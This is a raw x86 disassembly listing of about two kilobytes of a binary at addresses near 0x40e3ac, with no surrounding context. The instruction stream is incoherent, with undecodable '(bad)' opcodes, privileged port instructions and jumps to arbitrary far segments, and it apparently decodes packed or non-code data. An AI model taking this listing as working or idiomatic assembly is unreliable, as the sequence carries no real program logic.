  40e3ac:	cmp    esi,DWORD PTR cs:[ebp+ebp*8-0x32739549]
  40e3b4:	jnp    0x40e35c
  40e3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b7:	inc    ebx
  40e3b9:	add    DWORD PTR [ecx-0x24],0xffffff8f
  40e3bd:	add    eax,0xd4f3bee9
  40e3c2:	dec    ebx
  40e3c3:	sbb    dh,bl
  40e3c5:	mov    cl,0x59
  40e3c7:	mov    al,0x74
  40e3c9:	jo     0x40e35d
  40e3cb:	sub    esi,DWORD PTR [eax]
  40e3cd:	push   esp
  40e3ce:	fsubr  st,st(5)
  40e3d0:	stos   BYTE PTR es:[edi],al
  40e3d1:	shl    BYTE PTR [ebx],cl
  40e3d3:	daa    
  40e3d4:	adc    ecx,DWORD PTR [esi*4-0x5713c0be]
  40e3db:	ret    
  40e3dc:	daa    
  40e3dd:	adc    edx,DWORD PTR [ecx]
  40e3df:	mov    esp,0xfd98e810
  40e3e4:	out    dx,al
  40e3e5:	fbld   TBYTE PTR [ebx]
  40e3e7:	enter  0x9828,0x21
  40e3eb:	scas   al,BYTE PTR es:[edi]
  40e3ec:	and    bh,BYTE PTR [ebx-0x14]
  40e3ef:	mov    ebx,0xc53f1c6
  40e3f4:	imul   BYTE PTR [esi+eax*4+0x39b1b34d]
  40e3fb:	cmc    
  40e3fc:	and    eax,0x5e262b53
  40e401:	pop    es
  40e402:	cwde   
  40e403:	test   al,0xf4
  40e405:	fisttp WORD PTR [edx-0x22]
  40e408:	ds mov ebp,0x16e0627
  40e40e:	mov    edx,DWORD PTR [ebx]
  40e410:	xchg   esi,eax
  40e411:	shl    DWORD PTR [edi-0x2b07d7d9],0x58
  40e418:	push   ss
  40e419:	inc    ebx
  40e41a:	stos   BYTE PTR es:[edi],al
  40e41b:	add    DWORD PTR [ecx],eax
  40e41d:	mov    ?,WORD PTR [edi-0x1e1dc26b]
  40e423:	test   BYTE PTR [ecx],bh
  40e425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e426:	lock in al,dx
  40e428:	fild   WORD PTR [ebx+0x57]
  40e42b:	aas    
  40e42c:	sub    BYTE PTR [esp+eiz*4-0x120ef846],ah
  40e433:	popf   
  40e434:	lds    ecx,FWORD PTR [edx]
  40e436:	enterw 0xcdd3,0x6d
  40e43b:	xor    DWORD PTR [ecx-0x75e5fe8b],0xad0cb27e
  40e445:	push   0x99be86e0
  40e44a:	xor    esi,DWORD PTR [ebp-0x42]
  40e44d:	inc    edx
  40e44e:	cli    
  40e44f:	pushf  
  40e450:	loop   0x40e3fb
  40e452:	jns    0x40e47b
  40e454:	std    
  40e455:	and    dh,BYTE PTR [ecx-0x5060971]
  40e45b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40e45d:	mov    ds:0xe3d222f2,al
  40e462:	stos   DWORD PTR es:[edi],eax
  40e463:	mov    ebp,0x70db5fb2
  40e468:	sbb    edx,DWORD PTR [ebp+0x6cf56c3f]
  40e46e:	out    dx,al
  40e46f:	and    ch,dl
  40e471:	hlt    
  40e472:	push   eax
  40e473:	aaa    
  40e474:	push   ecx
  40e475:	xchg   edi,eax
  40e476:	jmp    0xa09a:0x9b99b4bb
  40e47d:	or     ebp,DWORD PTR [ecx]
  40e47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e480:	xchg   DWORD PTR [edx+edx*4-0x1ecc4d97],ebx
  40e487:	mov    edx,0xe2f0ee18
  40e48c:	hlt    
  40e48d:	jnp    0x40e412
  40e48f:	lods   eax,DWORD PTR ds:[esi]
  40e490:	inc    ah
  40e492:	aas    
  40e493:	push   ebp
  40e494:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40e496:	shl    BYTE PTR [ebx],cl
  40e498:	sub    BYTE PTR [edi],dh
  40e49a:	aas    
  40e49b:	iret   
  40e49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e49d:	ins    BYTE PTR es:[edi],dx
  40e49e:	retf   
  40e49f:	fstp   TBYTE PTR [ebp+0x4d]
  40e4a2:	outs   dx,DWORD PTR ds:[esi]
  40e4a3:	sbb    DWORD PTR [edx-0x3e],eax
  40e4a6:	call   0x1369:0x1009bb86
  40e4ad:	(bad)  
  40e4ae:	jmp    0xb009f741
  40e4b3:	add    al,0x90
  40e4b5:	or     eax,0x58009acf
  40e4ba:	jmp    0x6cd64bd8
  40e4bf:	adc    ah,BYTE PTR [ebp-0x3]
  40e4c2:	and    edx,DWORD PTR [eax]
  40e4c4:	jmp    0x9297ac01
  40e4c9:	popf   
  40e4ca:	sub    eax,DWORD PTR [ecx-0x65]
  40e4cd:	jmp    FWORD PTR [ebx-0x51af0b6e]
  40e4d3:	cmp    al,0x5
  40e4d5:	and    eax,0x84d2bfef
  40e4da:	jae    0x40e4e5
  40e4dc:	test   DWORD PTR [ecx-0x417ccec],0xac08ee2b
  40e4e6:	aad    0xd3
  40e4e8:	push   es
  40e4e9:	or     DWORD PTR [esi-0x28],esp
  40e4ec:	(bad)  
  40e4ee:	fidiv  DWORD PTR [esi]
  40e4f0:	inc    BYTE PTR [ecx-0x6f]
  40e4f3:	sbb    dl,BYTE PTR [edi]
  40e4f5:	inc    DWORD PTR [edx+eax*4-0x7]
  40e4f9:	addr16 add al,0xd3
  40e4fc:	scas   al,BYTE PTR es:[edi]
  40e4fd:	mov    cl,BYTE PTR [ebx-0x54]
  40e500:	adc    DWORD PTR [ecx+0x5b],ebp
  40e503:	push   edx
  40e504:	popa   
  40e505:	in     eax,dx
  40e506:	stc    
  40e507:	xchg   edx,eax
  40e508:	xor    eax,0xceab4537
  40e50d:	add    BYTE PTR [esp+ebp*1-0x2e],dl
  40e511:	or     ebx,DWORD PTR [edi-0x10]
  40e514:	inc    esi
  40e515:	(bad)  
  40e516:	jp     0x40e58d
  40e518:	mov    al,ds:0xdaaab17c
  40e51d:	out    dx,eax
  40e51e:	push   0xffffffde
  40e520:	add    al,0x84
  40e522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e523:	push   ss
  40e524:	jbe    0x40e541
  40e526:	pushf  
  40e527:	js     0x40e4f3
  40e529:	jnp    0x40e58a
  40e52b:	or     eax,0x2b156355
  40e530:	push   0xffffff84
  40e532:	out    0x92,eax
  40e534:	daa    
  40e535:	ins    BYTE PTR es:[edi],dx
  40e536:	and    BYTE PTR [edx+ebx*4],0x3a
  40e53a:	test   DWORD PTR gs:[ecx+eiz*2+0x76129b09],edi
  40e542:	push   esp
  40e543:	dec    eax
  40e544:	jae    0x40e578
  40e546:	es mov ebx,0x4e0c26b3
  40e54c:	jno    0x40e5cc
  40e54e:	push   edx
  40e54f:	dec    ebx
  40e550:	iret   
  40e551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e552:	ins    DWORD PTR es:[edi],dx
  40e553:	mov    eax,0x540751cd
  40e558:	sti    
  40e559:	xchg   DWORD PTR [edi],ecx
  40e55b:	leave  
  40e55c:	push   es
  40e55d:	call   0xf41a:0xe70e907a
  40e564:	out    0xb5,ax
  40e567:	mov    ebp,0x9de39b7a
  40e56c:	loope  0x40e573
  40e56e:	shl    DWORD PTR [edi+0x0],cl
  40e571:	mov    edx,0xdb41df3c
  40e576:	stos   BYTE PTR es:[edi],al
  40e577:	mov    WORD PTR [ebx-0x5e0331f4],?
  40e57d:	je     0x40e52b
  40e57f:	pop    edx
  40e580:	fisub  DWORD PTR [ebp-0x42]
  40e583:	cwde   
  40e584:	ret    0xe8fe
  40e587:	(bad)  
  40e588:	loope  0x40e5ab
  40e58a:	fdivrp st(4),st
  40e58c:	sub    BYTE PTR [edx+0x50],dh
  40e58f:	out    0x5b,al
  40e591:	xchg   edx,eax
  40e592:	fisub  DWORD PTR [edi+ecx*8+0x69]
  40e596:	adc    BYTE PTR [ebp+0x1d8798fe],bl
  40e59c:	xor    eax,0xe12c90d4
  40e5a1:	imul   esp,edi,0x67
  40e5a4:	xchg   esi,eax
  40e5a5:	jp     0x40e5bb
  40e5a7:	repz or al,0xdb
  40e5aa:	(bad)  
  40e5ab:	out    0xbf,al
  40e5ad:	retf   
  40e5ae:	(bad)  
  40e5af:	and    DWORD PTR [edi-0x550dc3f7],ebp
  40e5b5:	mov    ds:0xb22b6e1b,eax
  40e5ba:	sti    
  40e5bb:	mov    esi,0x16e4fe3a
  40e5c0:	mov    bl,0xd1
  40e5c2:	mov    ecx,0x4c2be393
  40e5c7:	and    bl,BYTE PTR es:[ecx+0x66]
  40e5cb:	sub    eax,0x7ae0a19b
  40e5d0:	stc    
  40e5d1:	xor    dl,dl
  40e5d3:	xor    eax,0xf22aff2a
  40e5d8:	cmp    eax,0x6e1ee322
  40e5dd:	cwde   
  40e5de:	and    eax,0xc9522ed0
  40e5e3:	jb     0x40e61c
  40e5e5:	(bad)  
  40e5e6:	jp     0x40e655
  40e5e8:	mov    WORD PTR [edx+0x6ef7a273],?
  40e5ee:	xchg   edx,eax
  40e5ef:	push   ds
  40e5f0:	pusha  
  40e5f1:	dec    ecx
  40e5f2:	loop   0x40e5a3
  40e5f4:	repz sti 
  40e5f6:	rcl    DWORD PTR [ecx+ecx*4],cl
  40e5f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5fa:	add    edx,esp
  40e5fc:	xchg   ebp,eax
  40e5fd:	mov    ebp,0xea2259cc
  40e602:	cmp    BYTE PTR [ebp+ebx*4+0x48],ch
  40e606:	cmp    edi,DWORD PTR [ebx-0x2f]
  40e609:	aad    0x8c
  40e60b:	push   ebp
  40e60c:	add    DWORD PTR ds:0xd06a5d71,0xa
  40e613:	pop    ss
  40e614:	mov    eax,ds:0x202964b9
  40e619:	or     eax,0x47bd10cc
  40e61e:	retf   0x48a1
  40e621:	adc    esi,DWORD PTR [ebx]
  40e623:	mov    bh,0x9
  40e625:	pop    es
  40e626:	adc    bl,BYTE PTR [ecx-0x12]
  40e629:	mov    ecx,0xfa1dbc3
  40e62e:	mov    edx,0x48ffbf4a
  40e633:	push   eax
  40e634:	jle    0x40e673
  40e636:	xor    edi,edx
  40e638:	ds mov ecx,0x9970f025
  40e63e:	lahf   
  40e63f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e640:	xchg   esi,eax
  40e641:	jns    0x40e676
  40e643:	xor    eax,0xcb1852da
  40e648:	mov    ebx,0x9578c8dd
  40e64d:	ror    bl,0xfe
  40e650:	stos   DWORD PTR es:[edi],eax
  40e651:	pop    eax
  40e652:	xor    eax,DWORD PTR [ecx-0x3bbd71ee]
  40e658:	jmp    0x83dc:0xb6082826
  40e65f:	mov    BYTE PTR [esi+0x1a],bh
  40e662:	jle    0x40e644
  40e664:	and    eax,0xa4cc82f2
  40e669:	xor    al,0xa8
  40e66b:	(bad)  
  40e66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e66d:	or     ecx,0xffffffa7
  40e670:	ficomp WORD PTR [ecx+0x55]
  40e673:	xor    DWORD PTR [ecx+0x54],ecx
  40e676:	mov    BYTE PTR [esi-0x77],0xa6
  40e67a:	push   0x6a2272f3
  40e67f:	mov    DWORD PTR [ecx+edi*8+0x5202958a],ebx
  40e686:	cmp    eax,0x1273c999
  40e68b:	fild   WORD PTR ds:0x1ee1e650
  40e691:	xchg   ebp,eax
  40e692:	fist   WORD PTR [ebp-0x60f15031]
  40e698:	imul   eax,edi,0xfffffff6
  40e69b:	int3   
  40e69c:	imul   edx,ecx,0xffffffe4
  40e69f:	lods   eax,DWORD PTR ds:[esi]
  40e6a0:	push   es
  40e6a1:	cdq    
  40e6a2:	inc    esi
  40e6a3:	ficomp DWORD PTR ds:0xe28ea01
  40e6a9:	mov    eax,ds:0xfbe2f5ba
  40e6ae:	sahf   
  40e6af:	jo     0x40e68a
  40e6b1:	call   0x44c3:0xf0a3e12a
  40e6b8:	dec    esp
  40e6b9:	inc    esi
  40e6ba:	jae    0x40e709
  40e6bc:	enter  0x2a06,0x13
  40e6c0:	adc    al,0xc4
  40e6c2:	sti    
  40e6c3:	adc    al,0x7d
  40e6c5:	imul   esp,DWORD PTR [esi+eiz*8],0xc426797e
  40e6cc:	enter  0xea76,0x40
  40e6d0:	repz retf 
  40e6d2:	xor    DWORD PTR [ebx+edi*1],eax
  40e6d5:	add    BYTE PTR [edx],ch
  40e6d7:	add    bh,BYTE PTR [edx-0x407157af]
  40e6dd:	cmp    al,0xbe
  40e6df:	lods   eax,DWORD PTR ds:[esi]
  40e6e0:	jmp    0x40e693
  40e6e2:	jle    0x40e6b3
  40e6e4:	xor    bh,0xc4
  40e6e7:	retf   0x6e3b
  40e6ea:	aas    
  40e6eb:	in     al,dx
  40e6ec:	add    ecx,esi
  40e6ee:	mov    dl,0x79
  40e6f1:	xor    DWORD PTR [eax],eax
  40e6f3:	cdq    
  40e6f4:	out    dx,al
  40e6f5:	push   cs
  40e6f6:	pop    esp
  40e6f7:	jmp    0xae0475cd
  40e6fc:	test   BYTE PTR [edx],0x1a
  40e6ff:	ret    0x248e
  40e702:	aas    
  40e703:	imul   edx,DWORD PTR [ecx-0x1fd11d24],0x1d976212
  40e70d:	cmp    cl,0x25
  40e710:	xor    al,dl
  40e712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e713:	fiadd  WORD PTR [edi-0x6d]
  40e716:	sbb    ah,BYTE PTR [ecx-0x5f14734b]
  40e71c:	ds cdq 
  40e71e:	xchg   edx,eax
  40e71f:	repz gs pop es
  40e722:	sti    
  40e723:	mov    ch,0xd3
  40e725:	push   ebx
  40e726:	pop    edi
  40e727:	repz adc BYTE PTR [edx+0x66],bh
  40e72b:	lods   al,BYTE PTR ds:[esi]
  40e72c:	mov    ds:0x84451100,al
  40e731:	sbb    eax,0xebbe2eae
  40e736:	dec    edx
  40e737:	sar    BYTE PTR [esi+0x64],1
  40e73a:	sub    DWORD PTR [ecx-0x10dbd19f],ebp
  40e740:	cs and al,al
  40e743:	push   ebp
  40e744:	cmp    al,0x76
  40e746:	sti    
  40e747:	sbb    dl,bl
  40e749:	push   edi
  40e74a:	cmp    ebx,DWORD PTR [ecx+0x4d]
  40e74d:	je     0x40e73a
  40e74f:	xchg   BYTE PTR [eax-0x46],dh
  40e752:	xor    al,0x7c
  40e754:	add    dl,BYTE PTR [ebp+edx*4+0x61]
  40e758:	enter  0xbcec,0x5f
  40e75c:	cmc    
  40e75d:	jbe    0x40e6e1
  40e75f:	mov    edi,0xd9131187
  40e764:	sub    cl,BYTE PTR [ebx]
  40e766:	dec    edi
  40e767:	fidiv  DWORD PTR [eax-0x77]
  40e76a:	das    
  40e76b:	fldcw  WORD PTR [ebx-0x79]
  40e76e:	fwait
  40e76f:	mov    dl,0x9a
  40e771:	xchg   ecx,eax
  40e772:	repz push edx
  40e774:	inc    edi
  40e775:	add    bl,BYTE PTR [esi+0x56d8066]
  40e77b:	in     eax,0xdf
  40e77d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40e77f:	ret    
  40e780:	sub    eax,0xc5d73818
  40e785:	jbe    0x40e738
  40e787:	cli    
  40e788:	out    dx,al
  40e789:	add    eax,0x2f74477e
  40e78e:	xchg   edx,eax
  40e78f:	into   
  40e790:	scas   al,BYTE PTR es:[edi]
  40e791:	xor    dh,al
  40e793:	add    DWORD PTR [esi-0x39d84fc1],edi
  40e799:	aad    0x8c
  40e79b:	clc    
  40e79c:	jnp    0x40e799
  40e79e:	dec    ecx
  40e79f:	sbb    ecx,esp
  40e7a1:	loop   0x40e779
  40e7a3:	xor    eax,0xa688d143
  40e7a8:	jno    0x40e789
  40e7aa:	push   esp
  40e7ab:	push   eax
  40e7ac:	mov    ds:0x84530bfb,al
  40e7b1:	movsx  edx,ax
  40e7b4:	xor    DWORD PTR [esi],edx
  40e7b6:	jmp    0x1d70:0x9cc9dd46
  40e7bd:	pop    es
  40e7be:	jle    0x40e803
  40e7c0:	pop    eax
  40e7c1:	popf   
  40e7c2:	jp     0x40e7a6
  40e7c4:	sbb    eax,0x2bd005
  40e7c9:	out    0xe5,eax
  40e7cb:	clc    
  40e7cc:	mov    cl,0x1a
  40e7ce:	dec    esp
  40e7cf:	scas   al,BYTE PTR es:[edi]
  40e7d0:	in     al,0xe0
  40e7d2:	in     eax,0x1c
  40e7d4:	jge    0x40e83c
  40e7d6:	(bad)  
  40e7d7:	repnz out 0xd7,al
  40e7da:	push   0x5d1020bb
  40e7df:	pop    ds
  40e7e0:	add    al,0x69
  40e7e2:	test   eax,0xb1e204bc
  40e7e7:	mov    ebp,0xd3c491c8
  40e7ec:	retf   
  40e7ed:	out    0x97,eax
  40e7ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7f0:	mov    bl,ah
  40e7f2:	inc    ebp
  40e7f3:	outs   dx,BYTE PTR ds:[esi]
  40e7f4:	sti    
  40e7f5:	hlt    
  40e7f6:	push   ss
  40e7f7:	inc    esp
  40e7f8:	push   ds
  40e7f9:	mov    eax,ds:0x896a6774
  40e7fe:	out    dx,al
  40e7ff:	popw   es
  40e801:	adc    BYTE PTR [esp+eiz*2-0x25],ch
  40e805:	outs   dx,BYTE PTR ds:[esi]
  40e806:	push   edx
  40e807:	xchg   esp,eax
  40e808:	lahf   
  40e809:	add    DWORD PTR [edx],edi
  40e80b:	mov    ebp,0x65874dd8
  40e810:	in     eax,0x11
  40e812:	adc    DWORD PTR [ebx],esi
  40e814:	ja     0x40e7f9
  40e816:	jo     0x40e7af
  40e818:	loop   0x40e7f9
  40e81a:	sub    DWORD PTR [ecx+0x5d],eax
  40e81d:	es sub ch,al
  40e820:	aad    0x46
  40e822:	xchg   ebx,eax
  40e823:	mov    ebx,0x2a696de9
  40e828:	xchg   DWORD PTR [ebp-0x7b8c7e2d],edx
  40e82e:	cmp    ah,BYTE PTR [ebx-0x429bd331]
  40e834:	bound  eax,QWORD PTR [esi]
  40e836:	icebp  
  40e837:	and    eax,0x259ae3c
  40e83c:	enter  0xff1f,0x2e
  40e840:	stos   DWORD PTR es:[edi],eax
  40e841:	lds    edx,FWORD PTR [ebp-0x1c]
  40e844:	sub    bl,BYTE PTR [edx+0x6ef9a076]
  40e84a:	sub    ecx,esp
  40e84c:	add    ecx,DWORD PTR [edi]
  40e84e:	enter  0xf5a0,0x17
  40e852:	loopne 0x40e814
  40e854:	scas   al,BYTE PTR es:[edi]
  40e855:	sti    
  40e856:	adc    cl,dh
  40e858:	fwait
  40e859:	and    DWORD PTR [bp+0x1c],ebp
  40e85d:	cmp    dl,BYTE PTR [edi-0x553f595b]
  40e863:	adc    ah,BYTE PTR [esi+0xda47530]
  40e869:	inc    edx
  40e86a:	inc    ebp
  40e86b:	fdiv   DWORD PTR [edx+0x78]
  40e86e:	outs   dx,DWORD PTR ds:[esi]
  40e86f:	sbb    DWORD PTR [esp+ebp*1+0x4e0aa9fb],0x59ae63f1
  40e87a:	adc    ecx,esi
  40e87c:	push   edi
  40e87d:	add    eax,0xb42b2950
  40e882:	fdivp  st(4),st
  40e884:	jo     0x40e87f
  40e886:	mov    al,ds:0x8e7f5909
  40e88b:	adc    BYTE PTR [ecx+ebx*1-0x4619c322],cl
  40e892:	fcmovnb st,st(1)
  40e894:	pusha  
  40e895:	fwait
  40e896:	jecxz  0x40e84a
  40e898:	jb     0x40e874
  40e89a:	out    dx,al
  40e89b:	xor    DWORD PTR [edx-0x2d43251d],0xffffffab
  40e8a2:	mov    dl,0xb1
  40e8a4:	inc    ecx
  40e8a5:	push   ebx
  40e8a6:	sub    dh,dl
  40e8a8:	imul   esi,DWORD PTR [ecx+0x5b],0xffffffd1
  40e8ac:	fst    DWORD PTR [ebp+0xceec886]
  40e8b2:	jge    0x40e87c
  40e8b4:	jns    0x40e850
  40e8b6:	xchg   esp,eax
  40e8b7:	xchg   ebx,eax
  40e8b8:	push   cs
  40e8b9:	lea    esi,[esp+eax*2+0x5ca80e41]
  40e8c0:	sub    edi,edx
  40e8c2:	pmullw mm7,mm7
  40e8c5:	call   0xc01ce2f9
  40e8ca:	mov    al,ds:0xe9b30688
  40e8cf:	arpl   WORD PTR [edi-0x21afd566],di
  40e8d5:	add    eax,0xc2fbd6b
  40e8da:	push   esi
  40e8db:	out    0x1b,al
  40e8dd:	xchg   edx,eax
  40e8de:	pop    es
  40e8df:	cmp    al,0x61
  40e8e1:	pop    eax
  40e8e2:	or     al,0x98
  40e8e4:	xchg   DWORD PTR [ebx-0x4],edi
  40e8e7:	sbb    eax,0x1ee7d525
  40e8ec:	jbe    0x40e87f
  40e8ee:	in     eax,0x10
  40e8f0:	js     0x40e91c
  40e8f2:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40e8f4:	sbb    BYTE PTR [eax-0x3c],dh
  40e8f7:	imul   edi,DWORD PTR [edi-0x78],0x3ef87b74
  40e8fe:	jmp    0x9801db28
  40e903:	lods   ax,WORD PTR es:[esi]
  40e906:	mov    dl,0xbd
  40e908:	pop    edi
  40e909:	xchg   esp,eax
  40e90a:	mov    bl,0x12
  40e90c:	adc    ecx,DWORD PTR [edi+ecx*1+0x1f]
  40e910:	dec    ecx
  40e911:	push   ss
  40e912:	aaa    
  40e913:	cmp    eax,0x687db5c6
  40e918:	mov    ds:0xf3255525,al
  40e91d:	mov    ds:0xdb6e3f1a,al
  40e922:	xor    bl,BYTE PTR [ebx+0x2b]
  40e925:	ins    BYTE PTR es:[edi],dx
  40e926:	mov    ebp,0x2cfd9812
  40e92b:	cwde   
  40e92c:	aad    0x6c
  40e92e:	xchg   esi,ebp
  40e930:	(bad)  
  40e931:	sub    eax,0xdeb5fadc
  40e936:	xchg   DWORD PTR [esi-0x5ecc8986],ecx
  40e93c:	dec    edx
  40e93d:	inc    ebx
  40e93e:	sbb    DWORD PTR [esi+0x7d30cd12],edi
  40e944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e945:	or     BYTE PTR [edx+ecx*1],0xd0
  40e949:	icebp  
  40e94a:	imul   edi,DWORD PTR [edx+ebp*8+0x601bba3c],0x2550a9d5
  40e955:	mov    cl,0x36
  40e957:	push   edi
  40e958:	repz and bh,ch
  40e95b:	rol    DWORD PTR [esi-0x771a3108],cl
  40e961:	xor    esi,DWORD PTR [ecx+0x64]
  40e964:	bound  ecx,QWORD PTR ds:0x87f2ebb6
  40e96a:	sub    DWORD PTR [ecx],ebx
  40e96c:	inc    esp
  40e96d:	sbb    BYTE PTR [ecx+0x79],0x16
  40e971:	dec    edi
  40e972:	ss aaa 
  40e974:	push   edi
  40e975:	mov    al,ds:0x6deea7ed
  40e97a:	stc    
  40e97b:	aas    
  40e97c:	into   
  40e97d:	adc    al,ch
  40e97f:	mov    bh,0x10
  40e981:	ins    DWORD PTR es:[edi],dx
  40e982:	push   es
  40e983:	xor    DWORD PTR [edx+0x44e42a09],0xa3c0e5dd
  40e98d:	sub    bh,BYTE PTR [esi-0x57]
  40e990:	mov    edx,0xb705a5c
  40e995:	addr16 shr edi,0x11
  40e999:	je     0x40e9ee
  40e99b:	add    dl,BYTE PTR [eax]
  40e99d:	push   cs
  40e99e:	adc    bh,dh
  40e9a0:	or     eax,0xf59ca658
  40e9a5:	add    DWORD PTR [ecx-0x6bd1534],ebp
  40e9ab:	outs   dx,DWORD PTR ds:[esi]
  40e9ac:	scas   eax,DWORD PTR es:[edi]
  40e9ad:	cld    
  40e9ae:	cmp    esi,DWORD PTR [eax]
  40e9b0:	push   ebp
  40e9b1:	in     al,0x55
  40e9b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9b4:	sbb    DWORD PTR [ecx],ebx
  40e9b6:	sbb    edi,ecx
  40e9b8:	jge    0x40e9cb
  40e9ba:	aaa    
  40e9bb:	jp     0x40e961
  40e9bd:	sub    BYTE PTR [esi+edi*1],al
  40e9c0:	mov    ah,0x6
  40e9c2:	fisttp DWORD PTR [edi]
  40e9c4:	xchg   esi,eax
  40e9c5:	popf   
  40e9c6:	add    DWORD PTR es:[edi],eax
  40e9c9:	imul   esp,DWORD PTR [edi-0x5],0x36fdeddf
  40e9d0:	cli    
  40e9d1:	stos   BYTE PTR es:[edi],al
  40e9d2:	push   0x50a967f5
  40e9d7:	loopne 0x40e9ce
  40e9d9:	mov    dl,BYTE PTR [ebp+0x33726b2]
  40e9df:	dec    edi
  40e9e0:	adc    eax,edx
  40e9e2:	iret   
  40e9e3:	adc    DWORD PTR [edx+esi*4-0x2a],ebx
  40e9e7:	mov    al,0xce
  40e9e9:	mov    ch,0x3
  40e9eb:	mov    al,0x5c
  40e9ed:	push   edx
  40e9ee:	stos   BYTE PTR es:[di],al
  40e9f0:	aas    
  40e9f1:	mov    DWORD PTR [edi],esi
  40e9f3:	and    ebp,DWORD PTR [ebx-0x7712505]
  40e9f9:	adc    eax,0xd903ded1
  40e9fe:	sub    BYTE PTR [esi-0x4d1038d9],bh
  40ea04:	sahf   
  40ea05:	icebp  
  40ea06:	add    bh,ah
  40ea08:	sbb    edi,ebp
  40ea0a:	sub    BYTE PTR [ecx+0xadfa552],ah
  40ea10:	rol    bh,cl
  40ea12:	xor    edx,eax
  40ea14:	cmp    DWORD PTR [edx+0x7fe3673a],ebx
  40ea1a:	xor    edx,eax
  40ea1c:	or     DWORD PTR [ecx-0x7246dc2f],edx
  40ea22:	jae    0x40eaa0
  40ea24:	lahf   
  40ea25:	or     al,0xed
  40ea27:	scas   eax,DWORD PTR es:[edi]
  40ea28:	data16 fcmovne st,st(3)
  40ea2b:	inc    edi
  40ea2c:	das    
  40ea2d:	sub    esp,DWORD PTR [edi+0x66]
  40ea30:	or     esp,DWORD PTR [edi]
  40ea32:	mov    ?,WORD PTR [ebp-0x41]
  40ea35:	dec    esp
  40ea36:	jmp    0x91c0:0x6090afe3
  40ea3d:	cmp    DWORD PTR [esi+0x63],esp
  40ea40:	sub    ch,0xe4
  40ea43:	inc    edx
  40ea44:	jmp    0xd8a21562
  40ea49:	mov    ah,0x8c
  40ea4b:	sbb    DWORD PTR [eax-0x6e2f5a95],esi
  40ea51:	inc    esp
  40ea52:	ds scas al,BYTE PTR es:[edi]
  40ea54:	pop    ds
  40ea55:	out    0x40,al
  40ea57:	sub    edx,DWORD PTR [eax]
  40ea59:	dec    edi
  40ea5a:	fldcw  WORD PTR [edi]
  40ea5c:	xchg   esi,eax
  40ea5d:	call   0x4f7091c1
  40ea62:	addr16 dec esi
  40ea64:	jb     0x40e9f1
  40ea66:	rcr    BYTE PTR [edx-0x15],1
  40ea69:	mov    ds:0x9b360a90,eax
  40ea6e:	sti    
  40ea6f:	icebp  
  40ea70:	or     bl,dh
  40ea72:	daa    
  40ea73:	and    esi,DWORD PTR [eax]
  40ea75:	sbb    DWORD PTR [eax-0x44],ebx
  40ea78:	in     al,dx
  40ea79:	rol    DWORD PTR [edi-0x58],0xaf
  40ea7d:	(bad)  
  40ea7e:	stc    
  40ea7f:	or     eax,0x3db6b23c
  40ea84:	push   0xffffffbc
  40ea86:	mov    ebx,0xfb35b3b8
  40ea8b:	scas   al,BYTE PTR es:[edi]
  40ea8c:	cmp    edx,ebp
  40ea8e:	repnz push ss
  40ea90:	sbb    DWORD PTR [edx],ecx
  40ea92:	xor    BYTE PTR [ecx],bl
  40ea94:	and    DWORD PTR [ecx+0x68],0xffffff8c
  40ea98:	mov    WORD PTR ds:0xd2d624b1,ss
  40ea9e:	jbe    0x40ea2b
  40eaa0:	sub    dl,dh
  40eaa2:	data16 or BYTE PTR [edi+ecx*2-0x5d1ef249],al
  40eaaa:	cmp    DWORD PTR [ecx-0x8ac1929],0x1fa6466d
  40eab4:	mov    edx,0xa204563f
  40eab9:	add    esi,DWORD PTR [ebx]
  40eabb:	aas    
  40eabc:	mov    ds:0x53f05154,eax
  40eac1:	pop    ebp
  40eac2:	scas   al,BYTE PTR es:[edi]
  40eac3:	fnsave [edi-0x11f56906]
  40eac9:	mov    bl,0xba
  40eacb:	sar    DWORD PTR [edi+0x761cbf8b],1
  40ead1:	rcl    BYTE PTR [esi-0x41f5099b],cl
  40ead7:	mov    ebp,0x4c4184e2
  40eadc:	aas    
  40eadd:	xlat   BYTE PTR ds:[ebx]
  40eade:	dec    eax
  40eadf:	ret    0x6aae
  40eae2:	pop    esp
  40eae3:	push   ecx
  40eae4:	mov    dl,0x45
  40eae6:	dec    ebx
  40eae7:	push   es
  40eae8:	push   ecx
  40eae9:	inc    ecx
  40eaea:	(bad)  
  40eaeb:	mov    esi,0xf6f1af05
  40eaf0:	scas   eax,DWORD PTR es:[edi]
  40eaf1:	dec    esp
  40eaf2:	add    eax,DWORD PTR [ebx+0x76]
  40eaf5:	adc    cl,al
  40eaf7:	and    eax,0x272b3dcf
  40eafc:	xchg   ebp,eax
  40eafd:	cwde   
  40eafe:	mov    WORD PTR [esp+edi*1+0x55],fs
  40eb02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb03:	lock mov al,ds:0x8f9c556f
  40eb09:	mov    es,WORD PTR [esi]
  40eb0b:	fnstsw WORD PTR [eax-0x11c744b2]
  40eb11:	in     eax,dx
  40eb12:	and    cl,ah
  40eb14:	fist   DWORD PTR [edi+0x74eaba26]
  40eb1a:	mov    edx,0xcb3d7cb1
  40eb1f:	add    DWORD PTR [edx+0x358095c],ebx
  40eb25:	sub    al,0x8b
  40eb27:	mov    DWORD PTR [eax+0x73],ebp
  40eb2a:	xchg   edi,eax
  40eb2b:	test   DWORD PTR [ebp+0x453a8ac8],edx
  40eb31:	seto   dh
  40eb34:	popa   
  40eb35:	pop    DWORD PTR [ebx+0x72a303e6]
  40eb3b:	stc    
  40eb3c:	outs   dx,DWORD PTR ds:[esi]
  40eb3d:	out    dx,eax
  40eb3e:	(bad)  
